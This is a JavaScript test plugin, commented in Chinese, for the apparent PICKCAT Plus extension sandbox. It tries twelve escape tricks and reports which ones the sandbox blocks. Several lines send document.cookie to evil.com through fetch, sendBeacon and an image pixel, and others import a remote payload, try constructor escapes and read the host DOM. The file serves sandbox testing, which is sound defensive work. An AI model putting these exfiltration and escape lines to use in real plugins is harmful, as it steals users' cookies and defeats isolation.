/*!
 * 🧪 安全实验室 · 一个"恶意插件"的自白
 *
 * 这个插件故意把自己能想到的越权手法全试一遍，然后把结果摊在卡片上。
 * 它存在的意义只有一个：让人亲眼看到沙盒到底挡没挡住。
 *
 * 作者：PICKCAT Plus（官方）
 */

const results = [];

function add(name, status, detail) {
    results.push({ name: name, status: status, detail: String(detail || '') });
}

/* 1. 直接拿 fetch ------------------------------------------------------- */
try {
    const r = await fetch('https://evil.com/steal?c=' + encodeURIComponent(document.cookie || ''));
    add('直接 fetch', '❌ 竟然通了', '状态 ' + r.status);
} catch (e) {
    add('直接 fetch', '✅ 被挡', e.message);
}

/* 2. XMLHttpRequest ---------------------------------------------------- */
try {
    const x = new XMLHttpRequest();
    x.open('GET', 'https://evil.com/xhr');
    x.send();
    add('XMLHttpRequest', '❌ 竟然通了', '请求已发出');
} catch (e) {
    add('XMLHttpRequest', '✅ 被挡', e.message);
}

/* 3. WebSocket --------------------------------------------------------- */
try {
    const ws = new WebSocket('wss://evil.com/ws');
    add('WebSocket', '❌ 竟然通了', '连接对象已创建');
    ws.close();
} catch (e) {
    add('WebSocket', '✅ 被挡', e.message);
}

/* 4. navigator.sendBeacon（最阴的一个，不产生响应，可静默外发） -------- */
try {
    const ok = navigator.sendBeacon('https://evil.com/beacon', 'stolen');
    add('sendBeacon', '❌ 竟然通了', '返回值 ' + ok);
} catch (e) {
    add('sendBeacon', '✅ 被挡', e.message);
}

/* 5. <img> 打点（图片请求不受 fetch 管，靠 CSP img-src 挡） ------------ */
try {
    const img = new Image();
    img.src = 'https://evil.com/pixel.gif?d=' + encodeURIComponent(document.cookie || '');
    add('Image 打点', '⚠️ 代码跑完了', '请求已交给浏览器，是否被 CSP 拦请看控制台');
} catch (e) {
    add('Image 打点', '✅ 被挡', e.message);
}

/* 6. 用 iframe 另开一条路（child-src 'none' 应该挡这个） --------------- */
try {
    const f = document.createElement('iframe');
    f.src = 'about:blank';
    document.body.appendChild(f);
    const w = f.contentWindow;
    const leaked = w && typeof w.fetch === 'function';
    add('iframe 另开一路', leaked ? '❌ 拿到干净 fetch' : '✅ 被挡', leaked ? '子页面有 fetch' : '连 iframe 都没建起来，或子页面无 fetch');
} catch (e) {
    add('iframe 另开一路', '✅ 被挡', e.message);
}

/* 7. 动态 import 远程脚本（script-src 应挡） --------------------------- */
try {
    await import('https://evil.com/payload.js');
    add('远程 import', '❌ 竟然通了', '模块已加载');
} catch (e) {
    add('远程 import', '✅ 被挡', e.message);
}

/* 8. 从原型链 / 各种角落把原生 fetch 挖出来 ---------------------------- */
let dug = null;
try {
    const cands = [
        ['window.fetch', function () { return window.fetch; }],
        ['self.fetch', function () { return self.fetch; }],
        ['globalThis.fetch', function () { return globalThis.fetch; }],
        ['原型链', function () { return Object.getPrototypeOf(window).fetch; }],
        ['构造器逃逸', function () { return window.constructor.constructor('return fetch')(); }],
        ['Function 挖取', function () { return Function('return typeof fetch==="function"?fetch:null')(); }],
        ['Worker 里取', function () { return null; }]
    ];
    for (let i = 0; i < cands.length; i++) {
        try {
            const v = cands[i][1]();
            if (typeof v === 'function' && String(v).indexOf('插件不能直接使用') < 0) {
                dug = cands[i][0];
                break;
            }
        } catch (e) { /* 这条路走不通，继续下一条 */ }
    }
} catch (e) { /* ignore */ }
add('挖原生 fetch', dug ? '❌ 从未加密的路径挖到了：' + dug : '✅ 全被挡', dug || '七条路径全军覆没');

/* 9. 想碰宿主页面（跨源，应该只有 null origin 的沙盒自己） -------------- */
try {
    const t = window.parent.document.title;
    add('读宿主 DOM', '❌ 竟然通了', '标题：' + t);
} catch (e) {
    add('读宿主 DOM', '✅ 被挡', e.message);
}

/* 10. 想碰 chrome.* 扩展能力 ------------------------------------------ */
try {
    const has = typeof chrome !== 'undefined' && chrome && chrome.storage;
    add('碰 chrome.storage', has ? '❌ 竟然通了' : '✅ 不存在', has ? '能访问 storage' : '沙盒里没有 chrome 对象');
} catch (e) {
    add('碰 chrome.storage', '✅ 被挡', e.message);
}

/* 11. 走正规出口，但目标不在白名单 ------------------------------------ */
try {
    await PickcatPlus.fetch('https://not-in-my-hosts.com/api');
    add('正规出口打白名单外', '❌ 竟然通了', '被放行了');
} catch (e) {
    add('正规出口打白名单外', '✅ 被挡', e.message);
}

/* 12. 走正规出口，白名单内（这条设计上允许，用来对比） ----------------- */
try {
    const r = await PickcatPlus.fetch('https://raw.githubusercontent.com/lszh2012/Pickcat-Plus/main/manifest.json');
    add('正规出口打白名单内', '✅ 出口正常工作', 'HTTP ' + r.status + '（说明闸门只管"能连谁"，不管"好人坏人"）');
} catch (e) {
    add('正规出口打白名单内', '⚠️ 出口报错', e.message);
}

/* ---------- 汇总 ---------- */
const passed = results.filter(function (r) { return r.status.indexOf('✅') === 0; }).length;
const failed = results.length - passed;

const lines = results.map(function (r) {
    return r.status + '  ' + r.name + (r.detail ? '  —  ' + r.detail.slice(0, 200) : '');
});

const card = await PickcatPlus.showCard({
    title: '🧪 安全实验室 · 12 项越权尝试',
    text: '正在逐个试……',
    loading: true
});

PickcatPlus.updateCard(card.cardId, {
    title: '🧪 安全实验室 · ' + passed + ' 挡住 / ' + failed + ' 漏网',
    text: lines.join('\n'),
    loading: false
});

results.forEach(function (r) { PickcatPlus.log(r.status + ' ' + r.name + ' — ' + r.detail); });

PickcatPlus.showToast('🧪 安全测试完成：' + passed + ' 项被挡，' + failed + ' 项漏网（详情看卡片）', 8000);

/* ---------- 第 13 项：死循环（不自动跑，要点按钮） ----------
 * 这一段故意不放进上面的自动测试里 —— 它会把插件自己（也就是整个
 * Worker）永久卡死。想知道看门狗到底管不管用，点左下角那颗
 * 「☠️ 死循环测试」按钮，然后观察：
 *   · 页面能不能继续滚动、面板能不能打开（应该完全正常）
 *   · 12 秒后是不是弹出「无响应，已强制停用」
 *   · 创意工坊卡片是不是变成「⚡ 已停用 · 重试」
 *   · 控制台是不是有一行「插件 12 秒没有心跳（疑似死循环）」
 */
await PickcatPlus.addInteractionButton(
    { id: 'loop', icon: '☠️', label: '死循环测试' },
    async function () {
        await PickcatPlus.showToast('3…2…1，现在开始死循环。页面不会卡，但它自己会被掐掉。', 3000);
        const t = Date.now();
        let n = 0;
        // 没有出口。Worker 心跳从此断掉，12 秒后沙盒页 terminate() 这个 Worker。
        while (true) {
            n++;
            if (n % 1000000 === 0 && Date.now() - t < 0) break;  // 永假条件，纯为了让压缩器别优化掉
        }
    }
);

